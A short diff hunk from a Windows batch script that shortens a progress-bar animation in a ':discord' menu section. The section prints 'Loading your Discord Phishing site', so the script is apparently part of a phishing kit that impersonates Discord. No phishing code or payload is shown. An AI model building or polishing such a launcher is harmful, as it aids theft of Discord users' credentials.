@@ -141,9 +141,9 @@ exit
 :discord
 cls
 set "progress="
-for /L %%i in (1,1,20) do (
+for /L %%i in (1,1,10) do (
     set progress=!progress!█
-    set /a percent=%%i*5
+    set /a percent=%%i*10
     cls
     echo Loading your Discord Phishing site: !progress! !percent!%%
     timeout /nobreak /t 1 >nul
